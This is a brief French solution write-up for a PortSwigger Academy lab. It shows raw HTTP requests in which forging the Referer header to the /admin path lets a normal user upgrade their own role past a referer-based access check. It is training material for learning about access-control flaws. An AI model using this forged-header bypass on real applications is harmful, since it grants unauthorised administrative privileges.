# Lab

https://portswigger.net/web-security/access-control/lab-referer-based-access-control

## Solution

La fonctionnalité d'upgrade le rôle d'un utilisateur est protégée par un contrôle d'accès basé sur le referer.

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a090005031b05d08108cb9c00fb0014.web-security-academy.net
Cookie: session=L8pMSsbVcjjqdlnLNWGR64QmspLnjhwG
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

En revanche, si on renseigne le referer avec l'URL du lab et l'endpoint `/admin` on a accès à la fonctionnalité.

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a090005031b05d08108cb9c00fb0014.web-security-academy.net
Cookie: session=L8pMSsbVcjjqdlnLNWGR64QmspLnjhwG
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a090005031b05d08108cb9c00fb0014.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```